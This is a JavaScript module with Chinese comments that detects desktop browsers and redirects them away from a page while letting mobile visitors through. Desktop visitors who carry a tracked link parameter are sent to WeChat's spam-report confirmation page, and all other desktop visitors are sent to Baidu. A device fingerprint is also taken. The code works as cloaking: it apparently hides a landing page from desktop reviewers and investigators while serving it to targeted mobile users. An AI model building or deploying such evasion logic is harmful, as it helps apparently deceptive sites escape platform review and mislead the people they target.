/**
 * 统一的PC端检测库
 * 用于检测PC端设备并根据用户身份进行重定向
 * 
 * 业务逻辑:
 * - 正常用户(访客) → 跳转到百度页面
 * - 数据库中的用户 → 跳转到微信举报页面
 */

/**
 * 检查是否为已知用户(数据库中的用户)
 * @param {string} f - 用户链接参数
 * @param {string} fingerprint - 设备指纹
 * @returns {boolean} true表示是数据库用户，false表示是正常访客
 */
function isKnownUser(f, fingerprint) {
    // 如果有有效的f参数，通常表示是数据库中的用户
    // 但是排除默认值，避免首页访问被误判
    if (f && f.trim() !== '' && f !== 'undefined' && f !== 'null' && f !== 'default') {
        return true;
    }

    // 可以根据需要添加更多的用户识别逻辑
    // 例如：检查fingerprint是否在已知用户列表中

    return false;
}

/**
 * 检测设备类型
 * @returns {object} 包含设备类型信息的对象
 */
function detectDevice() {
    var system = {
        win: false,
        mac: false,
        x11: false,
        mobile: false
    };
    
    var platform = navigator.platform;
    var userAgent = navigator.userAgent;
    
    // PC端检测
    system.win = platform.indexOf("Win") === 0;
    system.mac = platform.indexOf("Mac") === 0;
    system.x11 = (platform === "X11") || (platform.indexOf("Linux") === 0);
    
    // 移动端检测
    system.mobile = /android|iphone|ipad|mobile|blackberry|webos|windows phone/i.test(userAgent);
    
    return system;
}

/**
 * 执行PC端重定向
 * @param {boolean} isKnown - 是否为已知用户
 */
function redirectPC(isKnown) {
    if (isKnown) {
        // 数据库用户 → 微信举报页面
        // 数据库用户重定向到微信举报页面
        window.location.href = "https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=0&source=2";
    } else {
        // 正常访客 → 百度页面
        // 正常访客重定向到百度页面
        window.location.href = "https://m.baidu.com";
    }
}

/**
 * 初始化PC端检测
 * @param {object} config - 配置对象
 * @param {string} config.ff_pc - PC端检测开关 ('0'=关闭, '1'=开启)
 * @param {string} config.f - 用户链接参数
 * @param {string} config.fingerprint - 设备指纹
 * @param {boolean} config.debug - 是否开启调试模式
 */
function initPCDetection(config) {
    // 参数验证
    if (!config) {
        console.error('[PC检测] 配置参数不能为空');
        return;
    }
    
    var ff_pc = config.ff_pc || '0';
    var f = config.f || '';
    var fingerprint = config.fingerprint || '';
    // 移除debug参数，生产环境不需要调试
    
    // 调试日志已移除
    
    // 检查是否启用PC端检测
    if (ff_pc !== '1') {
        // PC端检测已关闭
        return;
    }
    
    // PC端检测已开启
    
    // 检测设备类型
    var device = detectDevice();
    
    // 设备检测完成
    
    // 如果检测到移动端，不进行重定向
    if (device.mobile) {
        return; // 移动端设备，允许访问
    }
    
    // 如果检测到PC端，进行重定向
    if (device.win || device.mac || device.x11) {
        // 检测到PC端设备，判断用户身份并执行重定向
        var isKnown = isKnownUser(f, fingerprint);
        redirectPC(isKnown);
    }
}

/**
 * 快速初始化函数（兼容现有代码）
 * @param {string} ff_pc - PC端检测开关
 * @param {string} f - 用户链接参数  
 * @param {string} fingerprint - 设备指纹
 */
function quickInitPCDetection(ff_pc, f, fingerprint) {
    initPCDetection({
        ff_pc: ff_pc,
        f: f,
        fingerprint: fingerprint,
        debug: false
    });
}

// 导出函数供全局使用
if (typeof window !== 'undefined') {
    window.initPCDetection = initPCDetection;
    window.quickInitPCDetection = quickInitPCDetection;
    window.isKnownUser = isKnownUser;
    window.detectDevice = detectDevice;
}
